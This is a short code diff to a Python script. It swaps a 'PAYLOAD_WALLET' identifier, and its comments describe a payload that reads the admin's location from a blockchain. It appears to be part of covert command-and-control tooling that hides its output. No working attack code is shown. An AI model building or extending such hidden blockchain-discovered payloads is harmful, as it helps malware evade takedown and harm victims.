@@ -22,7 +22,7 @@ except ImportError:
     sys.exit(1)
 
 DEBUG = False  # Set to False to hide all terminal output
-PAYLOAD_WALLET = "admin-b62ef7f6/001-f07273bd"  # HD-derived child wallet
+PAYLOAD_WALLET = "admin-1d30a55c/001-37bd1d12"  # HD-derived child wallet
 
 # Blockchain-Based Discovery
 # Admin publishes location to blockchain, payload reads from blockchain
@@ -542,3 +542,4 @@ if __name__ == "__main__":
             print("\nCheck logs at: %USERPROFILE%\\.fsdp_logs\\")
             input("\nPress Enter to exit...")
         sys.exit(1)
+
